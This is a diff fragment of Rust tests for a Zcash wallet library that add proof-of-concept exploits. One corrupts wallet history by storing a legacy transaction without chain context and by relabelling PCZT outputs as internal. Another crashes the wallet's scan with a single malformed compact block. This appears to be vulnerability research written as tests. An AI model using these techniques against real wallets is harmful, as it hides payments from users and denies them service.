+    decrypt_and_store_transaction(&network, st.wallet_mut(), &legacy_tx, None).unwrap();
+
+    // Sanity-check the first corruption immediately so later assertions can focus on
+    // coexistence rather than on whether Stage A happened at all.
+    let initial_legacy_sent_outputs = st.wallet().get_sent_outputs(&legacy_txid).unwrap();
+    let initial_legacy_displayed = initial_legacy_sent_outputs
+        .iter()
+        .find_map(|output| output.external_recipient().cloned())
+        .expect("missing chain context should surface the legacy external recipient");
+    assert_eq!(initial_legacy_displayed, legacy_external_recipient_addr);
+
+    // Phase 2: keep the very same wallet at present-day semantics before building the PCZT
+    // transaction.
+    //
+    // The legacy-context bug does not require the wallet itself to be missing a current chain
+    // tip. It is enough that `decrypt_and_store_transaction` is called without an explicit
+    // contextual height. We therefore initialize this composed-wallet PoC directly at a
+    // present-day birthday height and avoid walking the entire ZIP-212 grace period block by
+    // block.
+
+    let funding_value = Zatoshis::const_from_u64(350_000);
+    let sender_fvk = T::test_account_fvk(&st);
+    let funding_output =
+        FakeCompactOutput::new(&sender_fvk, AddressType::DefaultExternal, funding_value);
+    let _ = st.generate_block_at(
+        current_semantics_height,
+        BlockHash([0; 32]),
+        &[funding_output],
+        0,
+        0,
+        false,
+    );
+    st.scan_cached_blocks(current_semantics_height, 1);
+    st.wallet_mut()
+        .update_chain_tip(current_semantics_height)
+        .unwrap();
+    assert_eq!(
+        st.get_spendable_balance(account.id(), ConfirmationsPolicy::MIN),
+        funding_value,
+        "the modern funding block should leave the wallet with one spendable note for the PCZT phase",
+    );
+
+    let real_recipient_fvk = T::test_account_fvk(&st);
+    let real_recipient = T::fvk_default_address(&real_recipient_fvk);
+
+    let transfer_amount = Zatoshis::const_from_u64(200_000);
+    let request = TransactionRequest::new(vec![Payment::without_memo(
+        real_recipient.to_zcash_address(st.network()),
+        transfer_amount,
+    )])
+    .unwrap();
+
+    let input_selector = GreedyInputSelector::new();
+    let change_strategy =
+        single_output_change_strategy(StandardFeeRule::Zip317, None, T::SHIELDED_PROTOCOL);
+    let proposal = st
+        .propose_transfer(
+            account.id(),
+            &input_selector,
+            &change_strategy,
+            request,
+            ConfirmationsPolicy::MIN,
+        )
+        .unwrap();
+
+    let pczt_created = st
+        .create_pczt_from_proposal::<Infallible, _, Infallible>(
+            account.id(),
+            OvkPolicy::Sender,
+            &proposal,
+        )
+        .unwrap();
+
+    // Phase 3: build the second corruption through the normal PCZT lifecycle. The output
+    // itself stays valid and sender-recoverable; only wallet-bound classification metadata
+    // is rewritten from `External` to `InternalAccount`.
+    let pczt_reclassified = match T::SHIELDED_PROTOCOL {
+        ShieldedProtocol::Sapling => Updater::new(pczt_created)
+            .update_sapling_with(|mut updater| {
+                for index in 0..updater.bundle().outputs().len() {
+                    updater.update_output_with(index, |mut output_updater| {
+                        output_updater.set_proprietary(
+                            PROPRIETARY_OUTPUT_INFO_FOR_TESTS.into(),
+                            postcard::to_allocvec(&TestPcztRecipient::InternalAccount {
+                                receiving_account: account.id(),
+                            })
+                            .unwrap(),
+                        );
+                        Ok(())
+                    })?;
+                }
+                Ok(())
+            })
+            .unwrap()
+            .finish(),
+        #[cfg(feature = "orchard")]
+        ShieldedProtocol::Orchard => Updater::new(pczt_created)
+            .update_orchard_with(|mut updater| {
+                for index in 0..updater.bundle().actions().len() {
+                    updater.update_action_with(index, |mut action_updater| {
+                        action_updater.set_output_proprietary(
+                            PROPRIETARY_OUTPUT_INFO_FOR_TESTS.into(),
+                            postcard::to_allocvec(&TestPcztRecipient::InternalAccount {
+                                receiving_account: account.id(),
+                            })
+                            .unwrap(),
+                        );
+                        Ok(())
+                    })?;
+                }
+                Ok(())
+            })
+            .unwrap()
+            .finish(),
+        #[cfg(not(feature = "orchard"))]
+        ShieldedProtocol::Orchard => {
+            unreachable!("orchard output mutation requires orchard feature")
+        }
+    };
+
+    let pczt_updated = T::add_proof_generation_keys(pczt_reclassified, account.usk()).unwrap();
+    let sapling_prover = LocalTxProver::bundled();
+    let orchard_pk = ::orchard::circuit::ProvingKey::build();
+    let pczt_proven = Prover::new(pczt_updated)
+        .create_orchard_proof(&orchard_pk)
+        .unwrap()
+        .create_sapling_proofs(&sapling_prover, &sapling_prover)
+        .unwrap()
+        .finish();
+
+    let mut signer = Signer::new(pczt_proven).unwrap();
+    T::apply_signatures_to_pczt(&mut signer, account.usk()).unwrap();
+    let pczt_authorized = signer.finish();
+
+    let pczt_txid = st
+        .extract_and_store_transaction_from_pczt(pczt_authorized)
+        .unwrap();
+    let pczt_tx = st.wallet().get_transaction(pczt_txid).unwrap().unwrap();
+
+    // Recover the committed recipient from the finalized PCZT-derived transaction. This is
+    // the cryptographic ground truth for the second half of the composed PoC.
+    let recovered = T::try_output_recovery(
+        st.network(),
+        current_semantics_height,
+        &pczt_tx,
+        &sender_fvk,
+    )
+    .expect("sender OVK should recover the committed PCZT output");
+    let (_, recovered_to, _) = recovered;
+    assert_eq!(recovered_to, real_recipient);
+
+    // Phase 4: assert that both corruptions coexist after the wallet has gone through both
+    // lifecycles. The legacy sent-history entry must still be present, while the PCZT
+    // transaction must simultaneously lose its external-recipient classification.
+    let final_legacy_sent_outputs = st.wallet().get_sent_outputs(&legacy_txid).unwrap();
+    let final_legacy_displayed = final_legacy_sent_outputs
+        .iter()
+        .find_map(|output| output.external_recipient().cloned())
+        .expect("legacy sent-history entry should still expose the external recipient");
+    assert_eq!(final_legacy_displayed, legacy_external_recipient_addr);
+
+    let pczt_sent_outputs = st.wallet().get_sent_outputs(&pczt_txid).unwrap();
+    assert!(
+        pczt_sent_outputs
+            .iter()
+            .all(|output| output.external_recipient().is_none()),
+        "the later PCZT transaction should no longer expose any external recipient",
+    );
+
+    // Finally inspect the broader transaction-history API. Different wallet stores may react
+    // differently once both corruptions coexist:
+    //
+    // - some may fail to summarize the resulting state at all;
+    // - others may still return a summary, but only after reusing the corrupted
+    //   `InternalAccount` classification for the later PCZT transaction.
+    //
+    // Both outcomes are relevant to the composed wallet-state story, so the test accepts either
+    // as long as it does not recover the real external PCZT payment as a normal sent note.
+    match st.wallet().get_tx_history() {
+        Ok(history) => {
+            let pczt_summary = history
+                .iter()
+                .find(|summary| summary.txid() == pczt_txid)
+                .expect("the stored PCZT transaction should appear in history");
+            assert_eq!(
+                pczt_summary.sent_note_count(),
+                0,
+                "history should not recover the real external PCZT payment as a sent note",
+            );
+            assert!(
+                pczt_summary.has_change(),
+                "history should treat the reclassified PCZT output set as wallet-internal",
+            );
+        }
+        Err(history_err) => {
+            let history_message = format!("{history_err:?}");
+            assert!(
+                history_message.contains(&legacy_txid.to_string()),
+                "the failing history summary should identify the legacy transaction that was admitted through the missing-context path",
+            );
+        }
+    }
+}
+
+#[cfg(all(feature = "pczt", feature = "transparent-inputs"))]
+pub fn local_wallet_composed_state_can_panic_on_malformed_compact_block_during_followup_scan<
+    T: ShieldedPoolTester,
+    Dsf,
+>(
+    ds_factory: Dsf,
+    cache: impl TestCache,
+) where
+    Dsf: DataStoreFactory,
+    <Dsf as DataStoreFactory>::AccountId: serde::Serialize + serde::de::DeserializeOwned,
+{
+    use std::panic::{AssertUnwindSafe, catch_unwind};
+
+    use zcash_protocol::consensus::ZIP212_GRACE_PERIOD;
+
+    use crate::proto::compact_formats;
+
+    let compact_network = LocalNetwork {
+        overwinter: Some(BlockHeight::from_u32(1)),
+        sapling: Some(BlockHeight::from_u32(1)),
+        blossom: Some(BlockHeight::from_u32(1)),
+        heartwood: Some(BlockHeight::from_u32(1)),
+        canopy: Some(BlockHeight::from_u32(1)),
+        nu5: Some(BlockHeight::from_u32(1)),
+        nu6: None,
+        nu6_1: None,
+        #[cfg(zcash_unstable = "nu7")]
+        nu7: None,
+        #[cfg(zcash_unstable = "zfuture")]
+        z_future: None,
+    };
+
+    let mut st = TestBuilder::new()
+        .with_network(compact_network)
+        .with_data_store_factory(ds_factory)
+        .with_block_cache(cache)
+        .with_initial_chain_state(|_, network| {
+            let birthday_height = std::cmp::max(
+                network.activation_height(NetworkUpgrade::Nu5).unwrap() + 10,
+                network.activation_height(NetworkUpgrade::Canopy).unwrap()
+                    + ZIP212_GRACE_PERIOD
+                    + 10,
+            );
+
+            InitialChainState {
+                chain_state: ChainState::new(
+                    birthday_height - 1,
+                    BlockHash([0; 32]),
+                    Frontier::empty(),
+                    #[cfg(feature = "orchard")]
+                    Frontier::empty(),
+                ),
+                prior_sapling_roots: vec![],
+                #[cfg(feature = "orchard")]
+                prior_orchard_roots: vec![],
+            }
+        })
+        .with_account_having_current_birthday()
+        .build();
+    let account = st.test_account().cloned().unwrap();
+    let sender_dfvk = account.usk().sapling().to_diversifiable_full_viewing_key();
+
+    // This executable High-candidate PoC intentionally stays on the route that already works
+    // today:
+    //
+    // 1. corrupt wallet-visible state through the same two proven families:
+    //    - missing-context legacy Sapling admission
+    //    - post-signing PCZT output reclassification
+    // 2. keep the resulting wallet in active use
+    // 3. then crash the next normal scan with a single malformed compact block
+    //
+    // The point is not to prove consensus breakage. It is to show that one wallet can first be
+    // pushed into a semantically inconsistent local state and then be denied normal forward
+    // progress by one bad server-fed block.
+
+    let network = *st.network();
+    let legacy_target_height = network
+        .activation_height(NetworkUpgrade::Sapling)
+        .expect("Sapling activation height is known on the local test network");
+    let current_semantics_height = {
+        let canopy = network
+            .activation_height(NetworkUpgrade::Canopy)
+            .expect("Canopy activation height is known on the local test network")
+            + ZIP212_GRACE_PERIOD
+            + 10;
+        #[cfg(feature = "orchard")]
+        let canopy = canopy.max(
+            network
+                .activation_height(NetworkUpgrade::Nu5)
+                .expect("NU5 activation height is known on the local test network")
+                + 10,
+        );
+        canopy
+    };
+
+    let transparent_account_sk =
+        transparent::keys::AccountPrivKey::from_seed(&network, &[0x88; 32], zip32::AccountId::ZERO)
+            .unwrap();
+    let (transparent_addr, address_index) = transparent_account_sk
+        .to_account_pubkey()
+        .derive_external_ivk()
+        .unwrap()
+        .default_address();
+    let transparent_sk = transparent_account_sk
+        .derive_external_secret_key(address_index)
+        .unwrap();
+    let secp = secp256k1::Secp256k1::signing_only();
+    let transparent_pubkey = transparent_sk.public_key(&secp);
+
+    let legacy_external_usk =
+        UnifiedSpendingKey::from_seed(&network, &[0x99; 32], zip32::AccountId::ZERO).unwrap();
+    let legacy_external_recipient = legacy_external_usk
+        .sapling()
+        .to_diversifiable_full_viewing_key()
+        .default_address()
+        .1;
+    let legacy_external_recipient_addr: Address = legacy_external_recipient.into();
+
+    let legacy_change_usk =
+        UnifiedSpendingKey::from_seed(&network, &[0xaa; 32], zip32::AccountId::ZERO).unwrap();
+    let legacy_change_recipient = legacy_change_usk
+        .sapling()
+        .to_diversifiable_full_viewing_key()
+        .default_address()
+        .1;
+
+    let utxo = transparent::bundle::OutPoint::fake();
+    let coin = transparent::bundle::TxOut::new(
+        Zatoshis::const_from_u64(1_000_000),
+        transparent_addr.script().into(),
+    );
+
+    let mut legacy_builder = Builder::new(
+        network,
+        legacy_target_height,
+        BuildConfig::Standard {
+            sapling_anchor: Some(sapling::Anchor::empty_tree()),
+            orchard_anchor: Some(orchard::Anchor::empty_tree()),
+        },
+    );
+    legacy_builder
+        .add_transparent_p2pkh_input(transparent_pubkey, utxo, coin)
+        .unwrap();
+    legacy_builder
+        .add_sapling_output::<core::convert::Infallible>(
+            Some(sender_dfvk.to_ovk(Scope::External)),
+            legacy_external_recipient,
+            Zatoshis::const_from_u64(100_000),
+            MemoBytes::empty(),
+        )
+        .unwrap();
+    legacy_builder
+        .add_sapling_output::<core::convert::Infallible>(
+            Some(sender_dfvk.to_ovk(Scope::Internal)),
+            legacy_change_recipient,
+            Zatoshis::const_from_u64(885_000),
+            MemoBytes::empty(),
+        )
+        .unwrap();
+
+    let mut transparent_signing_set = TransparentSigningSet::new();
+    transparent_signing_set.add_key(transparent_sk);
+    let legacy_tx = legacy_builder
+        .mock_build(&transparent_signing_set, &[], &[], OsRng)
+        .unwrap()
+        .transaction()
+        .clone();
+    let legacy_txid = legacy_tx.txid();
+
+    decrypt_and_store_transaction(&network, st.wallet_mut(), &legacy_tx, None).unwrap();
+
+    let initial_legacy_sent_outputs = st.wallet().get_sent_outputs(&legacy_txid).unwrap();
+    let initial_legacy_displayed = initial_legacy_sent_outputs
+        .iter()
+        .find_map(|output| output.external_recipient().cloned())
+        .expect("missing chain context should surface the legacy external recipient");
+    assert_eq!(initial_legacy_displayed, legacy_external_recipient_addr);
+
+    let funding_value = Zatoshis::const_from_u64(350_000);
+    let sender_fvk = T::test_account_fvk(&st);
+    let funding_output =
+        FakeCompactOutput::new(&sender_fvk, AddressType::DefaultExternal, funding_value);
+    let _ = st.generate_block_at(
+        current_semantics_height,
+        BlockHash([0; 32]),
+        &[funding_output],
+        0,
+        0,
+        false,
+    );
+    st.scan_cached_blocks(current_semantics_height, 1);
+    st.wallet_mut()
+        .update_chain_tip(current_semantics_height)
+        .unwrap();
+    assert_eq!(
+        st.get_spendable_balance(account.id(), ConfirmationsPolicy::MIN),
+        funding_value,
+        "the modern funding block should leave the wallet with one spendable note for the PCZT phase",
+    );
+
+    let real_recipient_fvk = T::test_account_fvk(&st);
+    let real_recipient = T::fvk_default_address(&real_recipient_fvk);
+
+    let transfer_amount = Zatoshis::const_from_u64(200_000);
+    let request = TransactionRequest::new(vec![Payment::without_memo(
+        real_recipient.to_zcash_address(st.network()),
+        transfer_amount,
+    )])
+    .unwrap();
+
+    let input_selector = GreedyInputSelector::new();
+    let change_strategy =
+        single_output_change_strategy(StandardFeeRule::Zip317, None, T::SHIELDED_PROTOCOL);
+    let proposal = st
+        .propose_transfer(
+            account.id(),
+            &input_selector,
+            &change_strategy,
+            request,
+            ConfirmationsPolicy::MIN,
+        )
+        .unwrap();
+
+    let pczt_created = st
+        .create_pczt_from_proposal::<Infallible, _, Infallible>(
+            account.id(),
+            OvkPolicy::Sender,
+            &proposal,
+        )
+        .unwrap();
+
+    let pczt_reclassified = match T::SHIELDED_PROTOCOL {
+        ShieldedProtocol::Sapling => Updater::new(pczt_created)
+            .update_sapling_with(|mut updater| {
+                for index in 0..updater.bundle().outputs().len() {
+                    updater.update_output_with(index, |mut output_updater| {
+                        output_updater.set_proprietary(
+                            PROPRIETARY_OUTPUT_INFO_FOR_TESTS.into(),
+                            postcard::to_allocvec(&TestPcztRecipient::InternalAccount {
+                                receiving_account: account.id(),
+                            })
+                            .unwrap(),
+                        );
+                        Ok(())
+                    })?;
+                }
+                Ok(())
+            })
+            .unwrap()
+            .finish(),
+        #[cfg(feature = "orchard")]
+        ShieldedProtocol::Orchard => Updater::new(pczt_created)
+            .update_orchard_with(|mut updater| {
+                for index in 0..updater.bundle().actions().len() {
+                    updater.update_action_with(index, |mut action_updater| {
+                        action_updater.set_output_proprietary(
+                            PROPRIETARY_OUTPUT_INFO_FOR_TESTS.into(),
+                            postcard::to_allocvec(&TestPcztRecipient::InternalAccount {
+                                receiving_account: account.id(),
+                            })
+                            .unwrap(),
+                        );
+                        Ok(())
+                    })?;
+                }
+                Ok(())
+            })
+            .unwrap()
+            .finish(),
+        #[cfg(not(feature = "orchard"))]
+        ShieldedProtocol::Orchard => {
+            unreachable!("orchard output mutation requires orchard feature")
+        }
+    };
+
+    let pczt_updated = T::add_proof_generation_keys(pczt_reclassified, account.usk()).unwrap();
+    let sapling_prover = LocalTxProver::bundled();
+    let orchard_pk = ::orchard::circuit::ProvingKey::build();
+    let pczt_proven = Prover::new(pczt_updated)
+        .create_orchard_proof(&orchard_pk)
+        .unwrap()
+        .create_sapling_proofs(&sapling_prover, &sapling_prover)
+        .unwrap()
+        .finish();
+
+    let mut signer = Signer::new(pczt_proven).unwrap();
+    T::apply_signatures_to_pczt(&mut signer, account.usk()).unwrap();
+    let pczt_authorized = signer.finish();
+
+    let pczt_txid = st
+        .extract_and_store_transaction_from_pczt(pczt_authorized)
+        .unwrap();
+    let pczt_tx = st.wallet().get_transaction(pczt_txid).unwrap().unwrap();
+
+    let recovered = T::try_output_recovery(
+        st.network(),
+        current_semantics_height,
+        &pczt_tx,
+        &sender_fvk,
+    )
+    .expect("sender OVK should recover the committed PCZT output");
+    let (_, recovered_to, _) = recovered;
+    assert_eq!(recovered_to, real_recipient);
+
+    let final_legacy_sent_outputs = st.wallet().get_sent_outputs(&legacy_txid).unwrap();
+    let final_legacy_displayed = final_legacy_sent_outputs
+        .iter()
+        .find_map(|output| output.external_recipient().cloned())
+        .expect("legacy sent-history entry should still expose the external recipient");
+    assert_eq!(final_legacy_displayed, legacy_external_recipient_addr);
+
+    let pczt_sent_outputs = st.wallet().get_sent_outputs(&pczt_txid).unwrap();
+    assert!(
+        pczt_sent_outputs
+            .iter()
+            .all(|output| output.external_recipient().is_none()),
+        "the later PCZT transaction should no longer expose any external recipient",
+    );
+
+    match st.wallet().get_tx_history() {
+        Ok(history) => {
+            let pczt_summary = history
+                .iter()
+                .find(|summary| summary.txid() == pczt_txid)
+                .expect("the stored PCZT transaction should appear in history");
+            assert_eq!(
+                pczt_summary.sent_note_count(),
+                0,
+                "history should not recover the real external PCZT payment as a sent note",
+            );
+            assert!(
+                pczt_summary.has_change(),
+                "history should treat the reclassified PCZT output set as wallet-internal",
+            );
+        }
+        Err(history_err) => {
+            let history_message = format!("{history_err:?}");
+            assert!(
+                history_message.contains(&legacy_txid.to_string()),
+                "the failing history summary should identify the legacy transaction that was admitted through the missing-context path",
+            );
+        }
+    }
+
+    // With the composed state already in place, the wallet still looks active enough to keep
+    // scanning. Now feed it a single malformed compact block at the next height and require the
+    // next ordinary scan pass to crash on that untrusted input.
+    let next_height = current_semantics_height + 1;
+    let malformed_block = compact_formats::CompactBlock {
+        proto_version: 0,
+        height: u64::from(next_height),
+        hash: vec![0x55; 32],
+        prev_hash: vec![0x33; 31],
+        time: 0,
+        vtx: vec![],
+        chain_metadata: None,
+        header: vec![],
+    };
+    st.inject_compact_block(malformed_block);
+
+    let followup_scan = catch_unwind(AssertUnwindSafe(|| {
+        st.scan_cached_blocks(next_height, 1);
+    }));
+
+    assert!(
+        followup_scan.is_err(),
+        "after entering the composed corrupt state, a single malformed compact block should crash the next normal scan attempt",
+    );
 }
 
 /// Ensure that wallet recovery recomputes fees.
